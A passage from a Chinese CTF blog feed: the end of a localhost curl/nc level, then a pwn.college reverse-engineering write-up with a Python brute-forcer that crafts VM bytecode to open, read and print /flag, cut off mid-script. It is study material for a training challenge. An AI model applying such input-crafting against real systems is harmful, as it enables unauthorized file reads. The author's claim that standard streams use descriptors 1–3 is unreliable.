<span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-34"><a href="#level-34" class="headerlink" title="level 34"></a>level 34</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-c</span> cookies.txt http://127.0.0.1:80 <span class="token operator">&amp;&amp;</span> <span class="token function">curl</span> <span class="token parameter variable">-b</span> cookies.txt http://127.0.0.1:80 <span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-H</span> <span class="token string">"Cookie: cookie=6bdc50bc20a6b6dcd03710fd1b5db9a9"</span> http://127.0.0.1:80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Writeup</title>
      <link href="/2024/06/17/pwn-college-rev-22-1-writeup/"/>
      <url>/2024/06/17/pwn-college-rev-22-1-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/program-security/reverse-engineering">https://pwn.college/program-security/reverse-engineering</a></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240617111433.png" alt="20240617111433"></p><p>这一关跟上一关二进制程序的思路都是一样的，唯一不同的是，取消了回显。你无法直接通过回显判断各个指令、寄存器、系统调用对应的特征数。</p><p>首先想到的是，爆破，遍历所有的可能的指令表示。但很明显这个空间太大了，需要先缩小空间。于是，我根据各个指令操作寄存器的特征，尝试出不存在对应寄存器的特征值是<code>0x01</code>,<code>IMM</code>指令对应的特征数是<code>0x01</code>,<code>SYS</code>指令对应的特征数是<code>0x40</code>,<code>exit</code>系统调用对应的特征数是<code>0x02</code>。</p><p><strong>判断的思路是，指令有8种特征值，而寄存器只对应其中7种，恰好IMM指令只操作一种寄存器，所以可以根据不对应寄存器的特征值判断出IMM指令。然后剩下的指令中只有SYS指令只操作一种寄存器，所以也可以尝试出SYS指令。然后只有exit系统调用没有涉及寄存器，根据0x01这个不对应寄存器的特征数可以判断出exit指令。</strong></p><p>判断出能判断的指令之后，剩下的代码中尚未判断的指令、寄存器、系统调用有STM指令、a,b,c寄存器、open,read,write系统调用。最后，就是在可能的空间中遍历所有可能。</p><p>必须得感谢GPT的代码，这大大减少了我的工作量。不过虽然自动化代码减轻了负担，还是要尽可能了解代码书写的思路。</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>由于程序在最初会读取 <code>flag</code>文件的内容去生成种子，但是它没有关闭这个文件描述符<code>fd</code>。所以起初，为了缩小爆破空间，我想利用这个文件描述符，这样的话，不用重新将<code>/flag</code>字符串压入到栈中。因为文件描述符的赋值是按照从小到大进行赋值的，而标准输入、输出、以及报错占用了1，2，3。我又检查了程序其他位置没有打开文件的情况，所以，我猜测它应该是4。</p><p>可是没有成功，因为前期读取<code>flag</code>文件的时候，<code>fd</code>的文件偏移已经被置为文件末尾的位置了。所以再次通过这个文件描述符读取文件内容时，已经没有内容可以读取了。这个时候，有两种方式重置，第一种使用<code>lseek函数</code>将文件描述符的偏移量重新定位到文件开头，第二种重新打开文件，获取新的文件描述符，然后从新的文件描述符中读取内容。</p><p>第一种，我们无法实现；第二种，跟爆破一样。所以此方法失败。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># b'\x01\x04\&#123;a&#125;',  # imm a = 0x04</span><span class="token comment"># b'\x01\x60\&#123;c&#125;',  # imm c = 0x60  </span><span class="token comment"># b'\x01\x20\&#123;b&#125;',  # imm b = 0x20  </span><span class="token comment"># b'\x40\&#123;a&#125;\&#123;read&#125;',  # read(a, b, c) --return bytes -> a</span><span class="token comment"># b'\x01\x60\&#123;c&#125;',  # imm c = 0x60   </span><span class="token comment"># b'\x01\x01\&#123;a&#125;',  # imm a = 0x01 </span><span class="token comment"># b'\x01\x20\&#123;b&#125;',  # imm b = 0x20</span><span class="token comment"># b'\x40\&#123;a&#125;\&#123;write&#125;',  # write(a, b, c) ---return bytes -> a</span><span class="token comment"># b'\x40\x10\x02'  # exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>在C程序中，文件描述符是由操作系统分配的整数值，用于标识进程打开的文件或其他输入/输出资源（如管道、套接字等）。文件描述符的分配遵循以下规律：</p><p>预定义的文件描述符：</p><p>标准输入（stdin）: 文件描述符 0<br>标准输出（stdout）: 文件描述符 1<br>标准错误（stderr）: 文件描述符 2<br>顺序分配：</p><p>当一个进程打开一个新的文件或资源时，操作系统会按照从低到高的顺序分配文件描述符。通常，它会分配当前未使用的最小整数值。<br>例如，如果一个进程最初只打开了标准输入、标准输出和标准错误，那么下一个打开的文件将获得文件描述符 3。<br>文件描述符的重用：</p><p>如果一个文件描述符被关闭（例如通过 close 函数），那么该文件描述符的值可以被重新分配给以后打开的文件或资源。</p><h3 id="父子进程之间的继承"><a href="#父子进程之间的继承" class="headerlink" title="父子进程之间的继承"></a>父子进程之间的继承</h3><h4 id="如果通过其他程序启动这个程序，fd的值会有所不同吗？"><a href="#如果通过其他程序启动这个程序，fd的值会有所不同吗？" class="headerlink" title="如果通过其他程序启动这个程序，fd的值会有所不同吗？"></a>如果通过其他程序启动这个程序，fd的值会有所不同吗？</h4><p>ChatGPT<br>是的，如果通过其他程序启动这个程序，文件描述符（fd）的值可能会有所不同。这是因为文件描述符的分配是由操作系统管理的，并且是针对每个进程独立进行的。</p><p>当一个新进程启动时，它会继承其父进程的一些文件描述符（如标准输入、标准输出、标准错误）。此外，如果父进程在启动子进程之前已经打开了其他文件或资源，这些文件描述符也可能会传递给子进程。因此，子进程中的文件描述符分配可能会因为父进程的状态而有所不同。</p><p>具体示例<br>假设你有一个父进程 parent_program，它启动子进程 flag_program：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">flag_program<span class="token punctuation">.</span>c<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token keyword">unsigned</span> __int64 <span class="token function">flag_seed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    __int64 buf<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span>    v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取当前栈指针，具体实现视系统而定</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token function">__assert_fail</span><span class="token punctuation">(</span><span class="token string">"fd >= 0"</span><span class="token punctuation">,</span> <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> <span class="token number">0x11u</span><span class="token punctuation">,</span> <span class="token string">"flag_seed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token function">__assert_fail</span><span class="token punctuation">(</span><span class="token string">"read(fd, flag, 128) > 0"</span><span class="token punctuation">,</span> <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> <span class="token number">0x12u</span><span class="token punctuation">,</span> <span class="token string">"flag_seed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    seed <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0x1F</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>        seed <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> __int64 seed <span class="token operator">=</span> <span class="token function">flag_seed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Seed: %llu\n"</span><span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">parent_program<span class="token punctuation">.</span>c<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 父进程打开一个文件，这会占用一个文件描述符</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"parent_file.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Error opening parent_file.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 启动子进程</span>    <span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 子进程</span>        <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"./flag_program"</span><span class="token punctuation">,</span> <span class="token string">"./flag_program"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Error executing flag_program"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 父进程</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Error forking"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果分析<br>在上述例子中：</p><p>父进程 parent_program 在启动子进程 flag_program 之前打开了一个文件 parent_file.txt，这个文件描述符可能是 3（如果没有其他文件描述符被使用）。<br>子进程 flag_program 继承了父进程的文件描述符表，因此在子进程中，标准输入（0）、标准输出（1）、标准错误（2）之后，下一个可用的文件描述符将是 4。<br>因此，如果父进程打开了额外的文件或资源，子进程中的 fd 值将会受到影响。例如，如果 parent_program 打开了一个文件描述符 3，子进程 flag_program 中打开的 /flag 文件描述符可能会是 4 而不是 3。</p><p>总结<br>文件描述符的分配是从未使用的最小整数开始的。<br>如果父进程打开了额外的文件或资源，子进程会继承这些文件描述符，这会影响子进程中新分配的文件描述符的值。<br>在不同的环境和上下文中启动同一程序，文件描述符的具体值可能会有所不同。</p><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><ol><li><p>子进程的权限继承 —- 这一点比较重要！<br>当父进程启动子进程时，子进程通常会继承父进程的权限（用户ID和组ID）。因此，如果父进程本身没有权限访问 flag 文件，那么通过父进程启动的子进程也不会有权限访问 flag 文件。（调试程序的原理恐怕类似）</p></li><li><p>程序的权限提升（SUID）<br>如果 baby 程序是一个具有权限提升（Set User ID, SUID）的程序，并且该程序的所有者具有读取 flag 文件的权限，那么子进程在运行 baby 程序时可以获取到 flag 文件的内容。</p></li></ol><h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">import</span> subprocessdata_list_template <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\x01\x10\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM a = \x10</span>    <span class="token string">b'\x01\x2f\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM b = \x2f</span>    <span class="token string">b'\&#123;stm&#125;\&#123;b&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x01\x11\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM a = \x11</span>    <span class="token string">b'\x01\x66\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM b = \x66</span>    <span class="token string">b'\&#123;stm&#125;\&#123;b&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x01\x12\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM a = \x12</span>    <span class="token string">b'\x01\x6c\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM b = \x6c</span>    <span class="token string">b'\&#123;stm&#125;\&#123;b&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>        <span class="token string">b'\x01\x13\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM a = \x13</span>    <span class="token string">b'\x01\x61\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM b = \x61</span>    <span class="token string">b'\&#123;stm&#125;\&#123;b&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x01\x14\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM a = \x14</span>    <span class="token string">b'\x01\x67\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM b = \x67</span>    <span class="token string">b'\&#123;stm&#125;\&#123;b&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>        <span class="token string">b'\x01\x15\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM a = \x15</span>    <span class="token string">b'\x01\x00\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM b = \x00</span>    <span class="token string">b'\&#123;stm&#125;\&#123;b&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\x01\x00\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM b = \x00</span>    <span class="token string">b'\x01\x10\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># IMM a = \x10</span>    <span class="token string">b'\x40\&#123;a&#125;\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open  -- return file -> a</span>    <span class="token string">b'\x01\x60\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm c = 0x60  </span>    <span class="token string">b'\x01\x20\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b = 0x20  </span>    <span class="token string">b'\x40\&#123;a&#125;\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b, c) --return bytes -> a</span>    <span class="token string">b'\x01\x60\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm c = 0x60   </span>    <span class="token string">b'\x01\x01\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a = 0x01 </span>    <span class="token string">b'\x40\&#123;a&#125;\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># write  ---return bytes -> a</span>    <span class="token string">b'\x40\x10\x02'</span> <span class="token comment"># exit</span>    <span class="token comment"># b'\x01\x04\&#123;a&#125;',  # imm a = 0x04</span>    <span class="token comment"># b'\x01\x60\&#123;c&#125;',  # imm c = 0x60  </span>    <span class="token comment"># b'\x01\x20\&#123;b&#125;',  # imm b = 0x20  </span>    <span class="token comment"># b'\x40\&#123;a&#125;\&#123;read&#125;',  # read(a, b, c) --return bytes -> a</span>    <span class="token comment"># b'\x01\x60\&#123;c&#125;',  # imm c = 0x60   </span>    <span class="token comment"># b'\x01\x01\&#123;a&#125;',  # imm a = 0x01 </span>    <span class="token comment"># b'\x01\x20\&#123;b&#125;',  # imm b = 0x20</span>    <span class="token comment"># b'\x40\&#123;a&#125;\&#123;write&#125;',  # write(a, b, c) ---return bytes -> a</span>    <span class="token comment"># b'\x40\x10\x02'  # exit</span><span class="token punctuation">]</span><span class="token comment"># op_num = [0x02, 0x04, 0x08, 0x10, 0x20, 0x80]</span>op_num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">]</span>register_num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">]</span>sys_num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">]</span><span class="token comment"># </span>op_combinations <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>op_num<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Generate all possible unique combinations for registers a, b, and c</span>register_combinations <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>register_num<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Generate all possible unique combinations for sys read \ write \ open</span>sys_combinations <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>sys_num<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">)</span><span class="token punctuation">:</span>    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list_template<span class="token punctuation">:</span>        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>    <span class="token keyword">return</span> formatted_data_list<span class="token comment"># Set timeout in seconds</span>timeout <span class="token operator">=</span> <span class="token number">0.1</span><span class="token comment"># Iterate over all combinations</span><span class="token keyword">for</span> op_combo <span class="token keyword">in</span> op_combinations<span class="token punctuation">:</span>    <span class="token keyword">for</span> reg_combo <span class="token keyword">in</span> register_combinations<span class="token punctuation">:</span>        <span class="token keyword">for</span> sys_combo <span class="token keyword">in</span> sys_combinations<span class="token punctuation">:</span>            stm<span class="token punctuation">,</span> <span class="token operator">=</span> op_combo            a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> reg_combo            read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> open_ <span class="token operator">=</span> sys_combo            formatted_data_list <span class="token operator">=</span> format_data_list<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">)</span>                        <span class="token comment"># Convert list of byte strings to a single byte string for subprocess input</span>            data_input <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>formatted_data_list<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token comment"># Run the external program with the data_input and timeout</span>                process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>                    <span class="token punctuation">[</span><span class="token string">'/challenge/babyrev_level22.1'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>                    stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>                    stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE                <span class="token punctuation">)</span>                                stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token operator">=</span>data_input<span class="token punctuation">,</span>timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>                <span class="token comment"># Print output (for debugging purposes)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Operation: stm=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>stm<span class="token punctuation">&#125;</span></span><span class="token string">, Registers:  a=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">, b=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token string">, c=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">, sys: read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>read<span class="token punctuation">&#125;</span></span><span class="token string">, write=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>write<span class="token punctuation">&#125;</span></span><span class="token string">, open=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>open_<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                stdout <span class="token operator">=</span> stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"pwn"</span> <span class="token keyword">in</span> stdout<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Output: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>stdout<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                    exit<span class="token punctuation">(</span><span class="token number">1</span><span 